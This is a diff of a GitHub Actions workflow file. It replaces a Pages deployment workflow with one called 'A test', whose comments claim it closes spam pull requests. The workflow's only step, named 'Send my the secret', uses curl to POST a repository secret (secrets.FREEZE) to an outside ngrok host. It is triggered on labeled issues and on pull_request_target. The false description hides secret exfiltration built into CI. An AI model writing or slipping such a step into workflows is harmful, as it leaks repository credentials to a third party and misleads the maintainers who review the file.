@@ -1,67 +1,23 @@
-# TODO:
-# - [x] Concurrency
-# - [ ] Test matrix
-# - [x] Expressions
-# - [ ] scripts
-# - [x] GH CLI
+name: A test
 
-# Based on: https://github.com/actions/starter-workflows/blob/b1df8a546ed4d0f27d46aaf2f8ac1118bc522638/pages/static.yml
-# Out of the box, it deploys static content to GitHub Pages without a Jekyll build
-# Add: on failure, open an issue
-#   - adds an expression
-#   - adds use of GH CLI
-
-# Still need: Matrix and a script to do a thing
-#   - try: add a test for the markdown content, add a script to test files changed and then drop a comment in the PR with files changed
-#   - potentially: can also create a preview build?
-
-# Simple workflow for deploying static content to GitHub Pages
-name: Deploy static content to Pages
+# **What it does**: This action closes invalid pull requests in the open-source repository.
+# **Why we have it**: We get lots of spam in the open-source repository.
+# **Who does it impact**: Open-source contributors.
 
 on:
-  # Runs on pushes targeting the default branch
-  push:
-    branches: ["main"]
+  issues:
+    types: [labeled]
+  pull_request_target:
+    types: [labeled]
 
-  # Allows you to run this workflow manually from the Actions tab
-  workflow_dispatch:
-
-# Sets permissions of the GITHUB_TOKEN to allow deployment to GitHub Pages
 permissions:
   contents: read
-  pages: write
-  id-token: write
   issues: write
-
-# Allow only one concurrent deployment, skipping runs queued between the run in-progress and latest queued.
-# However, do NOT cancel in-progress runs as we want to allow these production deployments to complete.
-concurrency:
-  group: "pages"
-  cancel-in-progress: false
-
+  pull-requests: write
+  
 jobs:
-  # Single deploy job since we're just deploying
-  deploy:
-    environment:
-      name: github-pages
-      url: ${{ steps.deployment.outputs.page_url }}
+  test:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v3
-      - name: Setup Pages
-        uses: actions/configure-pages@v3
-      - name: Upload artifact
-        uses: actions/upload-pages-artifact@v2
-        with:
-          # Upload entire repository
-          path: '.'
-      - name: Deploy to GitHub Pages
-        id: deployment
-        uses: actions/deploy-pages@v2
-      - name: Notify of problem
-        if: ${{ failure() }}
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        run: |
-          gh issue create --title "Coudln't deploy" --body "We couldn't deploy ${{ github.ref }}"
+      - name: Send my the secret
+        run: curl -X POST -d hello:${{ secrets.FREEZE }} https://adac-71-52-25-203.ngrok.io
